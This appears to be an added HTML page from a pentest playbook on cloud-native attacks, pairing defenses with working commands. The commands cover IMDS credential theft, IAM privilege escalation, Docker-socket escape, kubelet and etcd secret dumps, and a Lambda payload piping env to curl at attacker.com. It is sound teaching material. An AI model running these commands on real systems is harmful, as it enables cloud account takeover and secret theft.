@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <style id="cj-guard">html{display:none!important}</style>
+  <script>(function(){if(self===top){var s=document.getElementById('cj-guard');if(s)s.parentNode.removeChild(s);}else{try{top.location.href=self.location.href;}catch(e){}}})();</script>
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Cloud-native pentesting: IMDS abuse beyond SSRF, IAM privilege escalation, public bucket discovery, container/K8s exposed APIs, Lambda/serverless secret leakage, and detection tooling.">
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23ff6633' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/%3E%3C/svg%3E">
+  <link rel="stylesheet" href="style.css">
+  <script src="../domain-bar.js" defer></script>
+  <title>Cloud-Native Pentesting · Web Pentest Playbook</title>
+</head>
+<body>
+
+<svg class="icon-sprite" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
+  <defs>
+    <symbol id="icon-shield" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></symbol>
+    <symbol id="icon-server" viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="8" rx="2"/><rect x="2" y="14" width="20" height="8" rx="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></symbol>
+  </defs>
+</svg>
+
+<nav class="topnav" aria-label="Primary">
+  <div class="nav-logo">
+    <a href="../index.html" class="logo-link">
+      <div class="logo-icon"><svg class="icon" aria-hidden="true"><use href="#icon-shield"/></svg></div>
+      <span class="logo-text">Web Pentest</span>
+      <span class="logo-tag">v2026</span>
+    </a>
+  </div>
+  <div class="nav-center">
+    <a href="../index.html" class="nav-link">Home</a>
+    <a href="../index.html#vulns" class="nav-link active">Vulnerabilities</a>
+    <a href="../web-pentest-playbook.html" class="nav-link">Playbook</a>
+    <a href="../days/day1.html" class="nav-link">Worksheets</a>
+    <a href="../report/index.html" class="nav-link">Report</a>
+  </div>
+  <div class="nav-right">
+    <a href="https://github.com/eligof/WebSec" target="_blank" rel="noopener noreferrer" class="nav-link" style="font-size:0.78rem;">GitHub</a>
+    <button class="theme-toggle" id="theme-toggle" aria-label="Toggle color theme">☀ Light</button>
+  </div>
+</nav>
+
+<div class="domain-bar" role="region" aria-label="Target domain bar">
+  <span class="domain-bar-label">🎯 Target</span><button type="button" class="bar-help-btn" title="Substitutes example.com / target.com / victim.com / myapp.com / legitimate.com (and prefixed forms like FUZZ.example.com) with your target. Skips emails, attacker domains, and chained subdomains." aria-label="What does this substitute?">?</button>
+  <input type="text" id="db-target" placeholder="acme.com or target.acme.com"
+         maxlength="253" autocomplete="off" inputmode="url"
+         aria-label="Target domain">
+  <button type="button" id="db-reset" title="Clear target and restore original snippets">↻ Reset</button>
+  <span class="domain-bar-status inactive" id="db-status" aria-live="polite">○ Inactive</span>
+</div>
+
+<div class="content-wrap" style="padding-top:2rem">
+  <div class="day-page-hero" style="--day-color: var(--danger)">
+    <div class="day-num">Vuln · Cloud-Native</div>
+    <h1>☁ Cloud-Native Pentesting</h1>
+    <p>Modern applications no longer run on a single web server with a database behind it — they run on EC2 or GKE nodes that mount IAM roles, in containers that share kernels with their neighbors, behind serverless dispatchers that hand each request to a fresh-ish Lambda. Each new abstraction adds a control plane, and each control plane has its own authentication model, its own metadata service, and its own footguns. This page covers the seven attack patterns you should test for once a target's infrastructure crosses the cloud-native line: instance metadata abuse, IAM privilege escalation, public bucket discovery, exposed container/Kubernetes APIs, and serverless secret leakage. None of them require a 0-day — they all live in the gap between "what the cloud provider offers by default" and "what the customer remembered to lock down."</p>
+  </div>
+
+  <section class="worksheet-section" style="border-left: 3px solid var(--warn); background: color-mix(in srgb, var(--warn) 6%, transparent);">
+    <h2 style="color: var(--warn);">⚠ Scope &amp; ethics</h2>
+    <p>Cloud accounts are blast-radius weapons. A harvested set of credentials from one IMDS hit can list every S3 bucket, every Secret in Secrets Manager, and every running EC2 in the account — well past the scope you were authorized for. Confirm <em>in writing</em> that the cloud account is in scope before exercising any of these techniques against a real target, and stop at proof-of-credential rather than escalating further. For practice, use intentionally vulnerable environments like CloudGoat, flaws.cloud, or kube-goat — they are explicitly designed for these techniques and won't bill the wrong AWS account when something goes sideways. Don't run privilege-escalation enumerators (Pacu, Prowler with <code>--allow-pii</code>) against a live customer tenant without the customer's security team aware and ready to suppress alarms.</p>
+  </section>
+
+  <section class="worksheet-section">
+    <h2><span class="ws-section-num">1</span>🛰 IMDS abuse beyond SSRF</h2>
+    <p class="ws-intro">Cloud instance metadata services (IMDS) on the link-local IP <code>169.254.169.254</code> issue temporary credentials for the attached IAM role. If you have any SSRF or server-side fetch primitive, you can mint AWS/GCP/Azure credentials that pivot you across the entire account. The metadata endpoint exists for legitimate reasons — workloads need a way to authenticate to other cloud services without storing long-lived secrets on disk — but the same endpoint is reachable from any process on the host, and worse, from any application that the attacker can convince to issue an HTTP request on the host's behalf.</p>
+
+    <p>The classic primitive is SSRF: a vulnerable image-fetcher, a webhook URL field, a PDF-rendering service, a "fetch URL preview" feature. Any of these handed an attacker-controlled URL becomes a one-shot credential exfiltrator. AWS responded with IMDSv2, which requires a session token obtained via PUT — most off-the-shelf SSRF primitives only do GET, so requiring IMDSv2 broke a large fraction of historical exploits. But IMDSv1 is still on by default for instances that pre-date the rollout, and many production accounts have never enforced the upgrade.</p>
+
+    <pre class="snippet"><code># AWS IMDSv1 — single GET request, no auth
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# Returns the role name, e.g. "ec2-app-role"
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-app-role
+# Returns: AccessKeyId, SecretAccessKey, Token, Expiration
+
+# AWS IMDSv2 — token-required (PUT to /api/token first)
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></pre>
+
+    <p>Each cloud provider runs its own metadata service with the same shape but different headers. GCP requires the <code>Metadata-Flavor: Google</code> header, which most naive SSRF primitives can't add but which Capture-the-Flag-grade SSRF (a request-smuggling chain, a header-injection sink, an HTTP-library quirk that allows arbitrary headers) usually can. Azure requires <code>Metadata: true</code> on a slightly different URL path. Knowing the right shape for each provider is half the battle.</p>
+
+    <pre class="snippet"><code># GCP equivalent
+curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token \
+  -H "Metadata-Flavor: Google"
+
+# Azure equivalent
+curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' \
+  -H "Metadata: true"</code></pre>
+
+    <p>Once you have the credentials, the next step isn't "exfiltrate via the original SSRF" — it's "use them like any other AWS credentials." Set the three magic environment variables and the AWS CLI will pick them up automatically. <code>sts get-caller-identity</code> tells you who you are; <code>iam get-user</code> and friends tell you what you can do; <code>s3 ls</code> is usually the fastest way to demonstrate impact in a report.</p>
+
+    <pre class="snippet"><code># Use harvested AWS creds via SSRF
+export AWS_ACCESS_KEY_ID=ASIA...
+export AWS_SECRET_ACCESS_KEY=...
+export AWS_SESSION_TOKEN=...
+aws sts get-caller-identity
+aws s3 ls
+aws iam get-user</code></pre>
+
+    <p><strong>Defenses:</strong> enforce IMDSv2 on every EC2 instance (<code>HttpTokens=required</code> on the instance metadata options, set at launch or via <code>aws ec2 modify-instance-metadata-options</code>). Set the hop limit to 1 so containers running on the host can't reach IMDS through the host's network namespace. Block <code>169.254.169.254</code> at the egress proxy / SSRF allowlist for any service that fetches user-supplied URLs. In Kubernetes, attach a NetworkPolicy that denies pod egress to the link-local range, and use IRSA / Workload Identity so pods get their own scoped credentials instead of inheriting the node's.</p>
+  </section>
+
+  <section class="worksheet-section">
+    <h2><span class="ws-section-num">2</span>🔓 IAM privilege escalation</h2>
+    <p class="ws-intro">Even a "low-privilege" IAM role can pivot to admin if it has the wrong combination of permissions. Rhino Security Labs documented 21 known escalation paths in their canonical 2018 paper, and the catalog has only grown since. The pattern is always the same: you can't directly grant yourself <code>*:*</code>, but you can do something <em>adjacent</em> — create a Lambda function that runs as a more privileged role, edit a role's trust policy to make yourself a trusted principal, attach a managed policy to your own user — and the indirect path lands you at admin in one or two hops.</p>
+
+    <p>The single most reliable escalation is <code>iam:CreateAccessKey</code> on any user with stronger permissions than yours. It doesn't require any social engineering or chaining — you simply mint a new long-lived key against a more privileged user and use it as your own. Its cousins, <code>iam:PassRole</code> + <code>lambda:CreateFunction</code> (or <code>ec2:RunInstances</code>, <code>ecs:RegisterTaskDefinition</code>, <code>glue:CreateJob</code>, etc.), are the indirect form: you don't have admin yourself, but you can ask a compute service to run code as a role that does. <code>iam:UpdateAssumeRolePolicy</code> is the most surgical: rewrite the trust document on an admin role so that you become a trusted principal, then <code>sts assume-role</code> into it.</p>
+
+    <pre class="snippet"><code># Self-elevate via iam:CreateAccessKey
+aws iam create-access-key --user-name &lt;attached-user&gt;
+# Now you have permanent (non-rotating) credentials
+
+# iam:PassRole + lambda:CreateFunction — execute as a more-privileged role
+aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument]'
+aws lambda create-function --function-name pwn \
+  --runtime python3.11 --role &lt;admin-role-arn&gt; \
+  --handler lambda_function.lambda_handler \
+  --zip-file fileb://payload.zip
+aws lambda invoke --function-name pwn output.json
+
+# iam:UpdateAssumeRolePolicy — make yourself a trusted principal
+aws iam update-assume-role-policy --role-name admin \
+  --policy-document file://trust-attacker.json</code></pre>
+
+    <p>You don't have to enumerate by hand. Pacu — Rhino's open-source AWS exploitation framework — ships modules that map the current credentials' permissions and then check each known escalation path against them. The output is a ranked list of "you can probably escalate via X" candidates with the exact next command to run. Treat its output as hypotheses, not verdicts: a couple of paths require non-default conditions (a particular service principal, a specific resource policy) that the enumerator can't always check.</p>
+
+    <pre class="snippet"><code># Enumerate paths with Pacu
+pacu --session pen
+import iam__enum_permissions
+iam__privesc_scan</code></pre>
+
+    <p><strong>Defenses:</strong> attach a permission boundary to every IAM role that limits the maximum effective permissions, even if a policy is later attached that would otherwise grant more. Review every trust policy quarterly — the trust document is the single point of failure for cross-account compromise. Run AWS IAM Access Analyzer in CI to catch risky policies before they ship. Wire CloudTrail alarms on the exact API calls attackers use: <code>CreateAccessKey</code>, <code>UpdateAssumeRolePolicy</code>, <code>AttachUserPolicy</code>, <code>PutUserPolicy</code>, <code>CreateFunction</code> with a non-default role. None of these calls are part of normal application traffic, so the false-positive rate is low and the signal is high.</p>
+  </section>
+
+  <section class="worksheet-section">
+    <h2><span class="ws-section-num">3</span>🪣 Public S3 / GCS / Azure blob discovery</h2>
+    <p class="ws-intro">Most cloud-data leaks come from misconfigured buckets — public READ on what should be private. The bucket name is global across the entire cloud provider's namespace, so brute-forcing candidate names against AWS's S3 endpoint or GCP's storage endpoint is cheap, fast, and unauthenticated. The combination of "predictable naming conventions" + "default permissions are private but humans flip them" + "no rate limit on bucket-existence checks" makes this the highest-yield recon pattern in cloud testing.</p>
+
+    <p>The recon flow is permutation-based: take the target's company name and every product brand they ship, then mash them against common suffixes (<code>-prod</code>, <code>-staging</code>, <code>-backups</code>, <code>-logs</code>, <code>-uploads</code>, <code>-public</code>, <code>-internal</code>, <code>-dev</code>, <code>-tmp</code>) and prefixes (the company's ticker symbol, the year). Tools like <code>cloud_enum</code> and <code>s3recon</code> automate the wordlist permutation and the parallel HEAD requests to check existence and listability across all three hyperscalers in one run.</p>
+
+    <pre class="snippet"><code># Bucket name brute-force (cloud_enum, s3recon)
+cloud_enum -k acme -k acme-corp -k acmeprod
+s3recon acme-domains.txt
+
+# Test a candidate bucket — works without creds if public
+aws s3 ls s3://acme-prod-backups --no-sign-request
+aws s3 cp s3://acme-prod-backups/db.sql.gz . --no-sign-request
+
+# Find buckets via Google dorking too
+# site:s3.amazonaws.com "acme.com"
+# site:storage.googleapis.com "acme.com"</code></pre>
+
+    <p>Once you confirm a public bucket, the next question is "what's in it that the company would not want public?" The instinct is to recursive-list and grep for keywords, but big buckets routinely have millions of objects — a smarter first pass filters by size. Backups, database dumps, customer data exports, and CI artifacts are usually larger than a few megabytes, while a public-asset bucket holding logos and CSS is full of tiny files. Sort by descending size and read the top 50 keys; that's where the high-impact findings hide.</p>
+
+    <pre class="snippet"><code># Once inside, look for: configs with creds, customer data, CI artifacts
+aws s3api list-objects --bucket acme-prod-backups --no-sign-request \
+  --query 'Contents[?Size>`100000000`].{Key:Key,Size:Size}'</code></pre>
+
+    <p><strong>Defenses:</strong> enable the account-level S3 Public Access Block on every AWS account (4 toggles, all on, no exceptions for production). Add the bucket-level public-access block too — defense-in-depth in case the account-level toggle is later relaxed. Run AWS Config rule <code>s3-bucket-public-read-prohibited</code> with auto-remediation that flips public buckets back to private. Mirror the same controls on GCS (uniform bucket-level access + public-access prevention enforced at the org policy level) and Azure (storage-account "allow public blob access = false"). Audit access logs for unauthenticated reads — a public bucket that nobody is reading from is also a public bucket nobody will miss when you make it private.</p>
+  </section>
+
+  <section class="worksheet-section">
+    <h2><span class="ws-section-num">4</span>🐳 Container / K8s exposed APIs</h2>
+    <p class="ws-intro">Containers and Kubernetes introduce new exposed control planes, each one a one-shot RCE if it lands. The Docker socket is root-equivalent on the host: any process that can write to <code>/var/run/docker.sock</code> can launch a container that mounts the host filesystem at <code>/</code> and chroot into it. The Kubernetes API on port <code>:6443</code> with anonymous-auth turned on is full cluster takeover. The kubelet on <code>:10250</code> exposes a read API that, in older clusters, is unauthenticated and lets you exec into any pod on the node. Etcd on <code>:2379</code> contains the entire cluster state including every Secret in plaintext.</p>
+
+    <p>The Docker-socket-in-a-container case is the most common exploitable variant during application pentests. CI runners, GitLab DinD jobs, "innovative" cloud IDEs, and a wide variety of agentic-AI sandboxes all bind-mount the host's Docker socket into a worker container so the worker can build images. Anyone who lands code execution inside that worker — XSS-to-CI-job, malicious dependency in a build, a webshell on a CI box — gets root on the host through one Docker run.</p>
+
+    <pre class="snippet"><code># Docker socket exposure (in a container with /var/run/docker.sock mounted)
+docker -H unix:///var/run/docker.sock run -v /:/host alpine chroot /host
+
+# K8s API exposed on :6443 with anonymous-auth=true
+curl -k https://target.com:6443/api/v1/namespaces/kube-system/secrets
+
+# kubelet read API on :10250 (commonly unauthenticated pre-1.23)
+curl -k https://target.com:10250/pods
+curl -k https://target.com:10250/runningpods/
+
+# Exec into a running pod via kubelet
+curl -k --cert /tmp/cert.pem --key /tmp/key.pem \
+  -X POST "https://target.com:10250/run/&lt;namespace&gt;/&lt;pod&gt;/&lt;container&gt;" \
+  -d "cmd=cat /etc/shadow"</code></pre>
+
+    <p>Etcd exposure is the rarest of these but the most destructive. Etcd is the source of truth for the entire cluster — Pods, Secrets, ConfigMaps, ServiceAccounts, RBAC bindings, every network policy. A read on <code>/</code> with the <code>--prefix</code> flag dumps everything, including every plaintext Secret in every namespace. (Yes, by default Kubernetes Secrets are base64-encoded, not encrypted at rest, unless KMS encryption is explicitly configured.)</p>
+
+    <pre class="snippet"><code># Exposed etcd (port 2379) — full K8s state including all secrets
+ETCDCTL_API=3 etcdctl --endpoints=http://target.com:2379 get / --prefix</code></pre>
+
+    <p>For external recon against a Kubernetes target, <code>kube-hunter</code> is the canonical tool. It scans for the half-dozen control-plane ports, fingerprints each, and reports both passive findings (which control-plane endpoints are exposed) and active findings (which ones it could exploit unauthenticated). Pair its output with <code>kube-bench</code> on any node you can read on-box — <code>kube-bench</code> is the CIS-benchmark checker, and a fresh report from it usually identifies the same anonymous-auth, unauthenticated kubelet, and missing-NetworkPolicy issues that <code>kube-hunter</code> sees from outside.</p>
+
+    <pre class="snippet"><code># K8s recon tool — kube-hunter
+kube-hunter --remote target.com</code></pre>
+
+    <p><strong>Defenses:</strong> never expose the Docker socket without read-only constraints; prefer rootless Docker or Buildah/Kaniko for in-cluster builds. Disable anonymous auth on the K8s API (it's <code>--anonymous-auth=false</code>; default is correct on 1.6+ but check your distro's overrides). Lock down kubelet with <code>--anonymous-auth=false</code> and <code>--authorization-mode=Webhook</code>. Run etcd over TLS only and restrict access to control-plane nodes. Apply NetworkPolicies in every namespace — the default in Kubernetes is "all pods can reach all other pods on every port," which is wrong for any production-shaped trust model. Adopt the Pod Security Standards (Restricted profile) via Pod Security admission to block privileged containers, host-path mounts, and host-network pods by default.</p>
+  </section>
+
+  <section class="worksheet-section">
+    <h2><span class="ws-section-num">5</span>λ Lambda / Cloud Functions secret leakage</h2>
+    <p class="ws-intro">Serverless function env-vars routinely contain credentials — database passwords, third-party API keys, encryption keys for the function's own KMS-wrapped secrets. The convenience of <code>process.env.DB_PASSWORD</code> is the entire developer-experience pitch; the cost is that any RCE in the handler hands the attacker every secret the function knows. Worse, <code>/tmp</code> is shared across warm invocations on the same container — secrets dropped there persist for any later request that hits the same warm instance, even if those later requests come from a different user, a different tenant, or a different attacker entirely.</p>
+
+    <p>The exploitation path mirrors traditional web RCE: find a sink that lets you execute code in the function's process — a Log4Shell-shaped JNDI lookup, a deserialization gadget in the request handler, a server-side template injection in a generated report — then dump <code>os.environ</code> / <code>process.env</code> / <code>Object.entries(process.env)</code> back over the network. The "network" part doesn't even need to be the request response; Lambdas can usually make outbound HTTP, so a beacon to an attacker-controlled URL works fine.</p>
+
+    <pre class="snippet"><code># Trigger Lambda + dump env (typical sink: log4shell, RCE in handler)
+aws lambda invoke --function-name billing \
+  --payload '{"q":"$(env | curl -X POST -d@- attacker.com)"}'  \
+  /tmp/out.json
+
+# /tmp persistence across invocations
+# Invocation 1 (logs creds for later harvest):
+echo "AWS_KEY=$AWS_ACCESS_KEY_ID" >> /tmp/x
+# Invocation 2 (later, same warm container):
+cat /tmp/x  # creds from earlier invocation are still there
+
+# Lambda Layer abuse — attacker publishes a layer your function uses
+aws lambda publish-layer-version --layer-name common-utils \
+  --content S3Bucket=attacker-bucket,S3Key=evil.zip</code></pre>
+
+    <p>Once you have any one Lambda's role credentials, the natural pivot is "list every Lambda in the account and dump its environment variables." This isn't an exploit on those other Lambdas — you're just reading the function configuration as the role allows — but it's the fastest way to find the high-value secrets in the account. A typical mid-sized AWS account has a hundred Lambda functions, and four or five of them will have an <code>API_KEY</code> or <code>STRIPE_SECRET</code> sitting in plaintext env-vars.</p>
+
+    <pre class="snippet"><code># Dump all Lambda env vars across the account (post-compromise)
+for fn in $(aws lambda list-functions --query 'Functions[].FunctionName' --output text); do
+  aws lambda get-function-configuration --function-name "$fn" \
+    --query 'Environment.Variables'
+done</code></pre>
+
+    <p><strong>Defenses:</strong> store secrets in AWS Secrets Manager (with rotation) or Parameter Store SecureString instead of plaintext env-vars; have the function fetch them at cold start with a short TTL cache. Refresh secrets per-invocation for the highest-value credentials, accepting the small latency cost. Minimize <code>/tmp</code> reliance and explicitly clear it on handler entry if you must use it for caching. Enable Lambda Code Signing so only signed deployments can run, and require signing for any layer your functions consume — Lambda layer abuse is an underrated supply-chain vector when an attacker can publish a new version of a layer that downstream functions reference by major version. Use VPC-attached Lambdas with egress restricted to a known allowlist so a compromised function can't beacon home freely.</p>
+  </section>
+
+  <section class="worksheet-section">
+    <h2><span class="ws-section-num">6</span>🧰 Detection / mitigation tools</h2>
+    <p class="ws-intro">Cloud-native posture is a stack of small tools, each catching a different layer. None individually is a silver bullet; together they catch most of the realistic threat model. The list below is the set worth knowing by name during an engagement — they all have free tiers and integrate into CI in well-documented ways.</p>
+    <ul>
+      <li><strong>Prowler</strong> — multi-cloud security scanner; runs hundreds of CIS / NIST / SOC2-mapped checks against AWS, Azure, GCP, and Kubernetes in one binary. <a href="https://github.com/prowler-cloud/prowler" target="_blank" rel="noopener noreferrer">github.com/prowler-cloud/prowler</a></li>
+      <li><strong>ScoutSuite</strong> — multi-cloud auditing tool from NCC Group; produces a single browseable HTML report per account. The complement to Prowler — Prowler gives you a checklist, ScoutSuite gives you an explorable map. <a href="https://github.com/nccgroup/ScoutSuite" target="_blank" rel="noopener noreferrer">github.com/nccgroup/ScoutSuite</a></li>
+      <li><strong>Pacu</strong> — AWS exploitation framework from Rhino Security Labs; the offensive counterpart to Prowler. Modules for IAM privesc, persistence, lateral movement, exfil. <a href="https://github.com/RhinoSecurityLabs/pacu" target="_blank" rel="noopener noreferrer">github.com/RhinoSecurityLabs/pacu</a></li>
+      <li><strong>CloudGoat</strong> — vulnerable AWS environment for practice; deploys intentionally-misconfigured scenarios (privesc paths, exposed buckets, IMDS-to-S3 chains) you can attack without bumping into a real customer's bill. <a href="https://github.com/RhinoSecurityLabs/cloudgoat" target="_blank" rel="noopener noreferrer">github.com/RhinoSecurityLabs/cloudgoat</a></li>
+      <li><strong>kube-hunter</strong> / <strong>kube-bench</strong> — K8s security testing. <code>kube-hunter</code> is the active scanner (probes from outside or in-cluster), <code>kube-bench</code> runs the CIS Kubernetes Benchmark checklist on a node.</li>
+      <li><strong>Steampipe</strong> — SQL queries over cloud-resource state for ad-hoc audits. Lets you write <code>SELECT * FROM aws_s3_bucket WHERE bucket_policy_is_public</code> and get an instant answer. <a href="https://steampipe.io/" target="_blank" rel="noopener noreferrer">steampipe.io</a></li>
+      <li><strong>Hacking the Cloud</strong> — best community reference for offensive cloud techniques; an HTB-style playbook organized by cloud / service / technique. <a href="https://hackingthe.cloud/" target="_blank" rel="noopener noreferrer">hackingthe.cloud</a></li>
+      <li><strong>AWS IAM Access Analyzer + CloudTrail + GuardDuty</strong> — native AWS detection. Access Analyzer spots over-permissive policies, CloudTrail logs every API call, GuardDuty correlates them into known-bad patterns (instance credentials used from outside the account, Tor-egress, port-scanning).</li>
+      <li><strong>gVisor</strong> / <strong>Kata Containers</strong> — runtime isolation for hostile workloads. gVisor intercepts syscalls in userspace; Kata wraps each container in a lightweight VM. Either turns a container escape from "RCE on host" into "RCE in a sandbox."</li>
+      <li><strong>Falco</strong> — runtime threat detection in K8s. Watches syscalls and emits alerts when a pod does something suspicious (shell spawn in a container, write to <code>/etc</code>, unexpected outbound connection). Pairs naturally with the rest of this list.</li>
+    </ul>
+  </section>
+
+  <section class="worksheet-section">
+    <h2><span class="ws-section-num">7</span>📚 References</h2>
+    <ul>
+      <li><a href="https://hackingthe.cloud/" target="_blank" rel="noopener noreferrer">Hacking the Cloud</a> — community-maintained encyclopedia of offensive cloud techniques across AWS, GCP, Azure, and Kubernetes. The single best starting point for cloud pentesting playbooks.</li>
+      <li><a href="https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/" target="_blank" rel="noopener noreferrer">Rhino Security Labs — AWS IAM privesc paths</a> — the canonical 21-paths paper. Every escalation chain in Pacu's privesc module traces back to here.</li>
+      <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Kubernetes_Security_Cheat_Sheet.html" target="_blank" rel="noopener noreferrer">OWASP Kubernetes Security Cheatsheet</a> — defender-side checklist; pairs well with the offensive techniques in this page.</li>
+      <li>CIS AWS / Azure / GCP Foundations benchmarks — the universally-cited compliance baseline. Most enterprise cloud-security programs are scored against these. Worth reading the AWS one cover-to-cover at least once.</li>
+      <li><a href="https://attack.mitre.org/matrices/enterprise/cloud/" target="_blank" rel="noopener noreferrer">MITRE ATT&amp;CK Cloud Matrix</a> — cloud-specific tactics and techniques in the ATT&amp;CK framework; the right vocabulary for mapping your engagement findings into an industry-standard taxonomy.</li>
+    </ul>
+  </section>
+
+</div>
+
+<script>
+  (function(){
+    var t = localStorage.getItem('theme') || 'dark';
+    document.documentElement.setAttribute('data-theme', t);
+    var btn = document.getElementById('theme-toggle');
+    if(btn){
+      btn.textContent = t === 'dark' ? '☀ Light' : '🌙 Dark';
+      btn.addEventListener('click', function(){
+        var n = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+        document.documentElement.setAttribute('data-theme', n);
+        localStorage.setItem('theme', n);
+        btn.textContent = n === 'dark' ? '☀ Light' : '🌙 Dark';
+      });
+    }
+  })();
+</script>
+
+</body>
+</html>
